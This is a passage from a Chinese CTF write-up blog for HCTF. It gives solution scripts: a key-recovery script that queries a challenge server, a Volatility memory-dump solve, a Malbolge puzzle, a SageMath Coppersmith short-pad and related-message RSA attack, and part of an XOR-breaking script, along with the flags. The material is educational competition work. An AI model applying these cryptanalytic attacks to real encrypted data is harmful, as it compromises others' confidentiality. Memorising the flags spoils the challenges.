class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>])<span class=\"comment\">#0.00299699357119</span></span><br><span class=\"line\">orilist.append([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>])<span class=\"comment\">#0.00170157012619</span></span><br><span class=\"line\">orilist.append([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>])<span class=\"comment\">#0.00135932497845</span></span><br><span class=\"line\">orilist.append([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>])<span class=\"comment\">#0.000528410497059</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">msg = <span class=\"string\">'1,'</span>*<span class=\"number\">95</span>+<span class=\"string\">'1'</span></span><br><span class=\"line\">f = urlopen(url + <span class=\"string\">'msg='</span> + msg)</span><br><span class=\"line\">mylist = json.loads(f.read())</span><br><span class=\"line\">oricipher = mylist[<span class=\"string\">'raw_cipher'</span>].split(<span class=\"string\">','</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">list2str</span><span class=\"params\">(mylist)</span>:</span></span><br><span class=\"line\">\tresult = <span class=\"string\">''</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> mylist:</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> i == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\tresult += <span class=\"string\">'1,'</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tresult += <span class=\"string\">'0,'</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> result[:<span class=\"number\">-1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdst</span><span class=\"params\">(tempcipher,oricipher)</span>:</span></span><br><span class=\"line\">\tresult = <span class=\"number\">0.0</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(oricipher)):</span><br><span class=\"line\">\t\tresult += abs(pow(float(oricipher[i])-float(tempcipher[i]),<span class=\"number\">2</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">myresult1 = []</span><br><span class=\"line\">myresult2 = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">96</span>):</span><br><span class=\"line\">\tsumzerodst = <span class=\"number\">0.0</span></span><br><span class=\"line\">\tsumonedst = <span class=\"number\">0.0</span></span><br><span class=\"line\">\tmindst = <span class=\"number\">1.0</span></span><br><span class=\"line\">\tminchr = <span class=\"number\">-1</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(len(orilist)):</span><br><span class=\"line\">\t\tkey = orilist[j][:i] + [<span class=\"number\">0</span>] + orilist[j][i+<span class=\"number\">1</span>:]</span><br><span class=\"line\">\t\tf = urlopen(url + <span class=\"string\">'msg='</span> + msg + <span class=\"string\">'&amp;'</span> + <span class=\"string\">'key='</span> + list2str(key))</span><br><span class=\"line\">\t\tmylist = json.loads(f.read())</span><br><span class=\"line\">\t\ttempcipher = mylist[<span class=\"string\">'raw_cipher'</span>].split(<span class=\"string\">','</span>)</span><br><span class=\"line\">\t\tdst = getdst(tempcipher,oricipher)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> dst &lt; mindst:</span><br><span class=\"line\">\t\t\tmindst = dst</span><br><span class=\"line\">\t\t\tminchr = <span class=\"number\">0</span></span><br><span class=\"line\">\t\tsumzerodst += dst</span><br><span class=\"line\">\t\tkey = orilist[j][:i] + [<span class=\"number\">1</span>] + orilist[j][i+<span class=\"number\">1</span>:]</span><br><span class=\"line\">\t\tf = urlopen(url + <span class=\"string\">'msg='</span> + msg + <span class=\"string\">'&amp;'</span> + <span class=\"string\">'key='</span> + list2str(key))</span><br><span class=\"line\">\t\tmylist = json.loads(f.read())</span><br><span class=\"line\">\t\ttempcipher = mylist[<span class=\"string\">'raw_cipher'</span>].split(<span class=\"string\">','</span>)</span><br><span class=\"line\">\t\tdst = getdst(tempcipher,oricipher)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> dst &lt; mindst:</span><br><span class=\"line\">\t\t\tmindst = dst</span><br><span class=\"line\">\t\t\tminchr = <span class=\"number\">1</span></span><br><span class=\"line\">\t\tsumonedst += dst</span><br><span class=\"line\">\tmyresult1.append(minchr)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> sumonedst &gt; sumzerodst :</span><br><span class=\"line\">\t\tmyresult2.append(<span class=\"number\">0</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> :</span><br><span class=\"line\">\t\tmyresult2.append(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"======myresult======\"</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> myresult1</span><br><span class=\"line\"><span class=\"keyword\">print</span> myresult2</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"======myresult======\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">f = urlopen(url + <span class=\"string\">'msg='</span> + msg + <span class=\"string\">'&amp;'</span> + <span class=\"string\">'key='</span> + list2str(myresult1))</span><br><span class=\"line\">mylist = json.loads(f.read())</span><br><span class=\"line\">mycipher1 = mylist[<span class=\"string\">'raw_cipher'</span>].split(<span class=\"string\">','</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">f = urlopen(url + <span class=\"string\">'msg='</span> + msg + <span class=\"string\">'&amp;'</span> + <span class=\"string\">'key='</span> + list2str(myresult2))</span><br><span class=\"line\">mylist = json.loads(f.read())</span><br><span class=\"line\">mycipher2 = mylist[<span class=\"string\">'raw_cipher'</span>].split(<span class=\"string\">','</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> getdst(mycipher1,oricipher)</span><br><span class=\"line\"><span class=\"keyword\">print</span> getdst(mycipher2,oricipher)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> mycipher1 == oricipher:</span><br><span class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\"mycipher1\"</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> mycipher2 == oricipher:</span><br><span class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\"mycipher2\"</span></span><br></pre></td></tr></table></figure></p>\n<p>最开始我预设的orilist二维数组是[[1,0]<em>48,[0,1]</em>48,[1,1,0,0]<em>24,[0,0,1,1]</em>24],之后把距离结果空间向量更近的myresult作为新的key替换掉其中原本的key，一步一步缩小dst从而获得key的</p>\n<h3 id=\"easy-dump\"><a href=\"#easy-dump\" class=\"headerlink\" title=\"easy dump\"></a>easy dump</h3><p>Volatility + GIMP，可以查看内存里的内容，内存中有很多扫雷和写字板：i am boring真是服气2333<br>在文件大概3/4的位置，可以看到flag在画图里<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hctf&#123;big_brother_is_watching_you&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"difficult-programming-language\"><a href=\"#difficult-programming-language\" class=\"headerlink\" title=\"difficult programming language\"></a>difficult programming language</h3><p>给了键盘流量包，可以使用一航师傅的脚本直接得到键盘输入的内容。【\\&lt;GA>是～`】<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">D&apos;`;M?!\\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa&apos;e^]\\a`_X|V[Tx;&quot;VONSRQJn1MFKJCBfFE&gt;&amp;&lt;`@9!=&lt;5Y9y7654-,P0/o-,%I)ih&amp;%$#z@xw|&#123;ts9wvXWm3~</span><br></pre></td></tr></table></figure></p>\n<p>题目名称叫difficult programming language，google了一下什么破语言长这个样子。。<br><code>Malbolge.</code><br>网上找到运行工具 <a href=\"https://zb3.me/malbolge-tools/#interpreter\" target=\"_blank\" rel=\"noopener\">https://zb3.me/malbolge-tools/#interpreter</a><br>发现这个字符串里还有输错的一个字符。<br>经另一个工具的调试，可以得知是一个:写成了”号，解得flag<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hctf&#123;m4lb0lGe&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"Questionnaire\"><a href=\"#Questionnaire\" class=\"headerlink\" title=\"Questionnaire\"></a>Questionnaire</h3><p>谢谢杭电的师傅带来的题目们！</p>\n<h2 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h2><h3 id=\"xor-rsa\"><a href=\"#xor-rsa\" class=\"headerlink\" title=\"xor?rsa\"></a>xor?rsa</h3><p>这题目去网上找了一个Coppersmith’s Short Pad Attack的脚本解就完事了(代码是sage的)。做的时候有时候会出bug我猜是因为程序只考虑了m1 &lt; m2的情况<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">short_pad_attack</span><span class=\"params\">(c1, c2, e, n)</span>:</span></span><br><span class=\"line\">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\"></span><br><span class=\"line\">    g1 = x^e - c1</span><br><span class=\"line\">    g2 = (x+y)^e - c2</span><br><span class=\"line\"></span><br><span class=\"line\">    q1 = g1.change_ring(PRZZ)</span><br><span class=\"line\">    q2 = g2.change_ring(PRZZ)</span><br><span class=\"line\"></span><br><span class=\"line\">    h = q2.resultant(q1)</span><br><span class=\"line\">    h = h.univariate_polynomial()</span><br><span class=\"line\">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class=\"line\">    h = h.monic()</span><br><span class=\"line\"></span><br><span class=\"line\">    kbits = n.nbits()//(<span class=\"number\">2</span>*e*e)</span><br><span class=\"line\">    diff = h.small_roots(X=<span class=\"number\">2</span>^kbits, beta=<span class=\"number\">0.5</span>)[<span class=\"number\">0</span>]  <span class=\"comment\"># find root &lt; 2^kbits with factor &gt;= n^0.5</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> diff</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">related_message_attack</span><span class=\"params\">(c1, c2, diff, e, n)</span>:</span></span><br><span class=\"line\">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\">    g1 = x^e - c1</span><br><span class=\"line\">    g2 = (x+diff)^e - c2</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">gcd</span><span class=\"params\">(g1, g2)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> g2:</span><br><span class=\"line\">            g1, g2 = g2, g1 % g2</span><br><span class=\"line\">        <span class=\"keyword\">return</span> g1.monic()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> -gcd(g1, g2)[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    n= <span class=\"number\">27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917</span></span><br><span class=\"line\">    c1= <span class=\"number\">13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871</span></span><br><span class=\"line\">    c2= <span class=\"number\">657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358</span></span><br><span class=\"line\">    e = <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"difference of two messages is %d\"</span> % diff</span><br><span class=\"line\"></span><br><span class=\"line\">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class=\"line\">    m2 = m1 + diff</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"------\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> m1</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"------\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> pow(m1,e,n)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> c1</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"------\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> m2</span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"------\"</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> pow(m2,e,n)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> c2</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"xor-game\"><a href=\"#xor-game\" class=\"headerlink\" title=\"xor game\"></a>xor game</h3><p><a href=\"https://www.anquanke.com/post/id/161171#h2-0\" target=\"_blank\" rel=\"noopener\">参考</a><br>原理是汉明码，脚本如下:<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bxor</span><span class=\"params\">(a, b)</span>:</span>     <span class=\"comment\"># xor two byte strings of different lengths</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(a) &gt; len(b):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bytes([x ^ y <span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> zip(a[:len(b)], b)])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bytes([x ^ y <span class=\"keyword\">for</span> x, y <span class=\"keyword\">in</span> zip(a, b[:len(a)])])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hamming_distance</span><span class=\"params\">(b1, b2)</span>:</span></span><br><span class=\"line\">    differing_bits = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> byte <span class=\"keyword\">in</span> bxor(b1, b2):</span><br><span class=\"line\">        differing_bits += bin(byte).count(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> differing_bits</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">break_single_key_xor</span><span class=\"params\">(text)</span>:</span></span><br><span class=\"line\">    key = <span class=\"number\">0</span></span><br><span class=\"line\">    possible_space = <span class=\"number\">0</span></span><br><span class=\"line\">    max_possible = <span class=\"number\">0</span></span><br><span class=\"line\">    letters = string.ascii_letters.encode(<span class=\"string\">'ascii'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(text)):</span><br><span class=\"line\">        maxpossible = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(text)):</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a == b):</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            c = text[a] ^ text[b]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> c <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> letters <span class=\"keyword\">and</span> c != <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            maxpossible += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> maxpossible &gt; max_possible:</span><br><span class=\"line\">            max_possible = maxpossible</span><br><span class=\"line\">            possible_space = a</span><br><span class=\"line\">    key = text[possible_space] ^ <span class=\"number\">0x20</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(key)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">text = <span class=\"string\">''</span></span><br><span 